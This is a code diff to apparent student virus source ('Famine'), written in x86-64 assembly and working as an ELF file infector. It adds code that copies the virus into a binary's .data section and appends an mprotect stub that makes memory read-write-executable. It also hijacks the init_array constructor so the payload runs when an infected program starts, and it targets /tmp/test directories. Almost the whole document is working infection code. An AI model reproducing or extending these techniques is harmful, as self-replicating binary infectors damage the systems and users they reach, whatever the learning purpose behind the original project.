@@ -277,6 +277,8 @@ increase_text_size:
     add     QWORD [rax + p_memsz], virus_len
     add     rax, [rsp + last_text_shdr_off]
     add     QWORD [rax + sh_size], virus_len
+    mov     rdi, [rsp + payload_base_offset]
+    mov     rsi, [rsp + payload_base_address]
     jmp     hijack_constructor
 
 remap_and_infect_data:
@@ -326,6 +328,8 @@ update_offsets_everywhere:
     mov     r9, [rsp + new_file_size]
     sub     r9, [rsp + file_size]
     add     [rsp + bss_shdr_off], r9
+    add     [rsp + last_text_shdr_off], r9
+    add     [rsp + init_array_shdr_off], r9
     mov     rax, [rsp + map]
     add     [rax + e_shoff], r9
     mov     rcx, [rsp + bss_shdr_off]
@@ -348,12 +352,13 @@ shift_last_sections:
 update_sizes:
     mov     rax, [rsp + map]
     mov     rbx, rax
-    add     rbx, [rsp + data_phdr_off]
-    add     [rbx + p_filesz], r9
-    add     [rbx + p_memsz], r9
     add     rax, [rsp + bss_shdr_off]
     mov     r10, [rax + sh_size]
-    add     [rax + sh_size], r9
+    add     rbx, [rsp + data_phdr_off]
+    add     QWORD [rbx + p_filesz], virus_len
+    add     [rbx + p_filesz], r10
+    add     QWORD [rbx + p_memsz], virus_len
+    add     QWORD [rax + sh_size], virus_len
     mov     DWORD [rax + sh_type], SHT_PROGBITS
 
     mov     rdx, rax
@@ -373,29 +378,79 @@ copy_virus_in_data:
     mov     rcx, virus_lenq
     call    copy_payload
 
+    mov     rax, [rsp + map]
+    add     rax, [rsp + bss_shdr_off]
+    mov     rdx, [rax + sh_offset]
+    add     rdx, r10
+    mov     [rsp + payload_data_base_offset], rdx
+    mov     rdx, [rax + sh_addr]
+    add     rdx, r10
+    mov     [rsp + payload_data_base_address], rdx
+
+format_text_code_chunk:
+    mov     rbx, [rsp + map]
+    add     rbx, [rsp + data_phdr_off]
+    mov     r8, [rbx + p_vaddr]
+    mov     rax, r8
+    cqo
+    mov     r9, QWORD 0x1000
+    div     r9
+    sub     r8, rdx
+    mov     rcx, [rbx + p_memsz]
+    add     rcx, rdx
+    mov     [data_len], rcx
+    mov     rbx, [rsp + map]
+    add     rbx, [rsp + text_phdr_off]
+    mov     rax, [rbx + p_vaddr]
+    add     rax, [rbx + p_memsz]
+    mov     [rsp + payload_base_address], rax
+    sub     r8, rax
+    mov     [data_addr_offset], r8
+
+    lea     rsi, [rel payload_mprotect]
+    mov     rax, [rsp + map]
+    add     rax, [rsp + text_phdr_off]
+    mov     rdi, [rax + p_offset]
+    add     rdi, [rax + p_filesz]
+    mov     [rsp + payload_base_offset], rdi
+    add     rdi, [rsp + map]
+    mov     rcx, payload_mprotect_len
+copy_text_code_chunk:
+    lodsb
+    stosb
+    loop    copy_text_code_chunk
+
+    mov     rbx, [rsp + map]
+    mov     rax, rbx
+    add     rax, [rsp + text_phdr_off]
+    add     QWORD [rax + p_filesz], payload_mprotect_len
+    add     QWORD [rax + p_memsz], payload_mprotect_len
+    add     rbx, [rsp + last_text_shdr_off]
+    add     QWORD [rbx + sh_size], payload_mprotect_len
+
     mov     rdx, [rsp + new_file_size]
     mov     [rsp + file_size], rdx
-    jmp     munmap_quit_infect
+    mov     rdi, [rsp + payload_data_base_offset]
+    mov     rsi, [rsp + payload_data_base_address]
 
+; rdi       payload_base_offset
+; rsi       payload_base_address
 hijack_constructor:
     mov     rax, [rsp + map]
-    mov     rbx, [rsp + init_array_shdr_off]
-    add     rbx, rax
+    mov     rbx, rax
+    add     rbx, [rsp + init_array_shdr_off]
     add     rax, [rbx + sh_offset]
     mov     rdx, [rsp + payload_base_address]
     mov     [rax], rdx
     mov     r11, [rsp + map]
     add     r11, [rsp + init_rela_entry_off]
     mov     [r11 + r_addend], rdx
-    mov     rax, [rsp + payload_base_offset]
-    add     rax, [rsp + map]
-    add     rax, virus_len - 4 ; let's override init_ptr with the old_init_ptr
+    add     rdi, [rsp + map]
+    add     rdi, virus_len - 4 ; let's override init_ptr with the old_init_ptr
     mov     rdx, [rsp + old_init_func]
-    mov     rbx, rax
-    add     bl, 4
-    sub     rbx, [rsp + map]
-    sub     rdx, rbx
-    mov     DWORD [rax], edx
+    add     rsi, virus_len
+    sub     rdx, rsi
+    mov     DWORD [rdi], edx
 
 munmap_quit_infect:
     mov     rdi, [rsp + map]
@@ -431,6 +486,21 @@ end_copy:
     ret
 
 payload_mprotect:
+    lea     rdi, [rel payload_mprotect]
+    add     rdi, [rel data_addr_offset]
+    mov     rsi, [rel data_len]
+    mov     rdx, PROT_READ | PROT_WRITE | PROT_EXEC
+    xor     rax, rax
+    add     rax, SYS_MPROTECT
+    syscall
+    lea     rax, [rel payload_mprotect]
+    add     rax, [rel data_addr_offset]
+    add     rax, [rel data_len]
+    sub     rax, virus_len
+    jmp     rax
+    data_len: dq 0
+    data_addr_offset: dq 0
+
     payload_mprotect_len: equ $ - payload_mprotect
     dir1: db "/tmp/test/", 0
     dir2: db "/tmp/test2/", 0
@@ -438,8 +508,9 @@ payload_mprotect:
     signature: db "Famine version 1.0 (c)oded by alagroy-", 0
     data_tmp_text: db "Remapping and infecting .data", 10
         .len: equ $ - data_tmp_text
-    TIMES 0x4000 db 0 ; To trigger data infection for testing, will be removed eventuelly
+    ; TIMES 0x4000 db 0 ; To trigger data infection for testing, will be removed eventuelly
     final_jump: db 0xe9, 0, 0, 0, 0
+
 _end:
     xor     rdi, rdi
     mov     eax, SYS_EXIT
